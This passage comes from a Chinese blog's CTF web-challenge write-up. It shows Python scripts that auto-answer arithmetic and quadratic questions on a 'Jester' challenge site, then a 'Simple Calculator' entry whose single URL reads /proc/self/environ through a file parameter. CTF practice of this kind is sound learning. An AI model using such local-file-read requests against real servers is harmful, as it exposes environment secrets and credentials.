class="string">&#x27;What is&#x27;</span> <span class="keyword">in</span> x <span class="keyword">and</span> <span class="string">&#x27;+&#x27;</span> <span class="keyword">in</span> x)</span><br><span class="line">addition_str = addition_problem.text.strip().replace(<span class="string">&#x27;What is &#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;?&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&#x27;</span>).strip().split(<span class="string">&#x27; + &#x27;</span>)</span><br><span class="line">res = <span class="built_in">int</span>(addition_str[<span class="number">0</span>])+<span class="built_in">int</span>(addition_str[<span class="number">1</span>])</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;answer&quot;</span>:<span class="built_in">str</span>(res)</span><br><span class="line">&#125;</span><br><span class="line">ssss = session.post(url=url,data=data)</span><br><span class="line"><span class="built_in">print</span>(ssss.text)</span><br><span class="line"><span class="built_in">print</span>(ssss.headers)</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(ssss.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">question = soup.find_all(<span class="string">&#x27;p&#x27;</span>)[<span class="number">1</span>].text</span><br><span class="line"><span class="built_in">print</span>(question.split(<span class="string">&#x27; &#x27;</span>))</span><br><span class="line">expression = question.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">a = <span class="built_in">int</span>(expression[<span class="number">5</span>])</span><br><span class="line">b = <span class="built_in">int</span>(expression[<span class="number">8</span>])</span><br><span class="line">c = <span class="built_in">int</span>(expression[<span class="number">11</span>])</span><br><span class="line"><span class="built_in">print</span>(a,b,c)</span><br><span class="line">D = b**<span class="number">2</span> - <span class="number">4</span>*a*c</span><br><span class="line"><span class="keyword">if</span> D &lt; <span class="number">0</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;无实数根&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    root1 = (-b + D**<span class="number">0.5</span>) / (<span class="number">2</span>*a)</span><br><span class="line">    root2 = (-b - D**<span class="number">0.5</span>) / (<span class="number">2</span>*a)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;解：&#x27;</span>, <span class="built_in">round</span>(root1), <span class="built_in">round</span>(root2))</span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&quot;answer1&quot;</span>:<span class="built_in">str</span>(<span class="built_in">round</span>(root1)),</span><br><span class="line">    <span class="string">&quot;answer2&quot;</span>:<span class="built_in">str</span>(<span class="built_in">round</span>(root2))</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">ssss = session.post(url=url,data=data)</span><br><span class="line"><span class="built_in">print</span>(ssss.text)</span><br><span class="line"><span class="built_in">print</span>(ssss.headers)</span><br></pre></td></tr></table></figure>
+
+<p>知道了Session()可以保存cookie，改了一下自己的👉👈</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="comment"># 发送HTTP请求并解析HTML</span></span><br><span class="line">url = <span class="string">&quot;https://jester.acmcyber.com/validate&quot;</span></span><br><span class="line">session = requests.Session()</span><br><span class="line">response = session.get(url=url)</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(response.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line"><span class="comment"># 找到所有的&lt;p&gt;标签并获取包含算式的文本内容</span></span><br><span class="line">p_tags = soup.find_all(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">text = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> p_tags:</span><br><span class="line">    <span class="keyword">match</span> = re.search(<span class="string">r&#x27;(\d+)\s*\+\s*(\d+)&#x27;</span>, p.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        text = <span class="keyword">match</span>.group(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># 使用eval()函数计算算式的结果</span></span><br><span class="line"><span class="keyword">if</span> text:</span><br><span class="line">    operands = [<span class="built_in">int</span>(op) <span class="keyword">for</span> op <span class="keyword">in</span> text.split(<span class="string">&quot; + &quot;</span>)]</span><br><span class="line">    result = <span class="built_in">sum</span>(operands)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;算式:&quot;</span>, text)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;结果:&quot;</span>, result)</span><br><span class="line">    <span class="comment"># 将结果POST到表单中</span></span><br><span class="line">    form_data = &#123;</span><br><span class="line">        <span class="string">&quot;answer&quot;</span>: <span class="built_in">str</span>(result)</span><br><span class="line">    &#125;</span><br><span class="line">    response = session.post(url, data=form_data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;已将结果POST到表单中！&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;未找到算式！&quot;</span>)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">response = session.post(url=url,data=form_data)</span><br><span class="line">soup = BeautifulSoup(response.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line"><span class="comment"># 找到所有的&lt;p&gt;标签并获取包含算式的文本内容</span></span><br><span class="line">p_tags = soup.find_all(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">text = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> p_tags:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;What are the roots of&quot;</span> <span class="keyword">in</span> p.text:</span><br><span class="line">        text = p.text.strip()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># 解析算式并计算结果</span></span><br><span class="line"><span class="keyword">if</span> text:</span><br><span class="line">    <span class="comment"># 使用正则表达式匹配算式中的系数</span></span><br><span class="line">    pattern = <span class="string">r&#x27;(\d+)\s*x\^2\s*\+\s*(\d+)\s*x\s*\+\s*(\d+)&#x27;</span></span><br><span class="line">    <span class="keyword">match</span> = re.search(pattern, text)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        a, b, c = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>)), <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">2</span>)), <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">3</span>))</span><br><span class="line">        <span class="comment"># 计算一元二次方程的解</span></span><br><span class="line">        delta = b**<span class="number">2</span> - <span class="number">4</span>*a*c</span><br><span class="line">        <span class="keyword">if</span> delta &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;无实数解！&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> delta == <span class="number">0</span>:</span><br><span class="line">            x = -b / (<span class="number">2</span>*a)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;唯一实数解：&quot;</span>, x)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x1 = (-b + delta**<span class="number">0.5</span>) / (<span class="number">2</span>*a)</span><br><span class="line">            x2 = (-b - delta**<span class="number">0.5</span>) / (<span class="number">2</span>*a)</span><br><span class="line">            x1_rounded = <span class="built_in">round</span>(x1)</span><br><span class="line">            x2_rounded = <span class="built_in">round</span>(x2)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;两个实数解：&quot;</span>, x1_rounded, x2_rounded)</span><br><span class="line">        <span class="comment"># 将解POST到表单中</span></span><br><span class="line">        form_data = &#123;</span><br><span class="line">            <span class="string">&quot;answer1&quot;</span>: <span class="built_in">str</span>(x1_rounded),</span><br><span class="line">            <span class="string">&quot;answer2&quot;</span>: <span class="built_in">str</span>(x2_rounded)</span><br><span class="line">        &#125;</span><br><span class="line">        response = session.post(url=url, data=form_data)</span><br><span class="line">        <span class="comment"># 输出POST请求后的HTML源代码</span></span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;算式格式不正确！&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;未找到算式！&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Simple-Calculator"><a href="#Simple-Calculator" class="headerlink" title="Simple Calculator"></a>Simple Calculator</h2><p>在学长给的<code>/proc</code>提示下，<code>https://simple-calculator.acmcyber.com/source?file=/proc/self/environ</code></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+              <a href="/tags/web/" rel="tag"><i class="fa fa-tag"></i> web</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/02/15/ROIS%E5%86%AC%E4%BB%A4%E8%90%A5%E7%AC%AC%E4%B8%89%E5%91%A8%E8%87%B3%E7%AC%AC%E4%BA%94%E5%91%A8WriteUp/" rel="prev" title="ROIS冬令营第三周至第五周WriteUp">
+      <i class="fa fa-chevron-left"></i> ROIS冬令营第三周至第五周WriteUp
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/05/13/%E7%A6%8F%E5%B7%9E%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E9%83%A8%E5%88%86wp/" rel="next" title="福州大学信息安全竞赛部分wp">
+      福州大学信息安全竞赛部分wp <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=478507889&auto=1&height=66"></iframe>
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Bagels"><span class="nav-number">1.</span> <span class="nav-text">Bagels</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Birthday"><span class="nav-number">2.</span> <span class="nav-text">Birthday</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cat"><span class="nav-number">3.</span> <span class="nav-text">Cat</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Mean-Girls"><span class="nav-number">4.</span> <span class="nav-text">Mean Girls</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Star-Poet-Blog"><span class="nav-number">5.</span> <span class="nav-text">Star Poet Blog</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Secure-Platform"><span class="nav-number">6.</span> <span class="nav-text">Secure Platform</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Bank"><span class="nav-number">7.</span> <span class="nav-text">Bank</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cookies"><span class="nav-number">8.</span> <span class="nav-text">Cookies</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Injection-Perfection"><span class="nav-number">9.</span> <span class="nav-text">Injection Perfection</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL-Prevention-101"><span class="nav-number">10.</span> <span class="nav-text">SQL Prevention-101</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#What%E2%80%99s-on-the-Menu"><span class="nav-number">11.</span> <span class="nav-text">What’s on the Menu?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Jester"><span class="nav-number">12.</span> <span class="nav-text">Jester</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Simple-Calculator"><span class="nav-number">13.</span> <span class="nav-text">Simple Calculator</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="林涂"
+      src="/images/header.jpg">
+  <p class="site-author-name" itemprop="name">林涂</p>
+  <div class="site-description" itemprop="description">学习ing</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/LinTurrr" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;LinTurrr" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">林涂</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+<script src="https://unpkg.com/darkmode-js@1.5.7/lib/darkmode-js.min.js"></script>
+
+<script>
+var options = {
+  bottom: '64px',
+  right: 'unset',
+  left: '32px',
+  time: '0.5s',
+  mixColor: 'transparent',
+  backgroundColor: 'transparent',
+  buttonColorDark: '#100f2c',
+  buttonColorLight: '#fff',
+  saveInCookies: true,
+  label: '🌓',
+  autoMatchOsTheme: true
+}
+const darkmode = new Darkmode(options);
+window.darkmode = darkmode;
+darkmode.showWidget();
+</script>
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : true,
+      appId      : 'YVmWHQrHLOAW7ewgX1jprtQl-gzGzoHsz',
+      appKey     : 'dY6y287UlOydRGZnN74I8XyY',
+      placeholder: "输入你的评论\\n昵称为必填项目",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '3' || 10,
+      visitor    : true,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : true,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
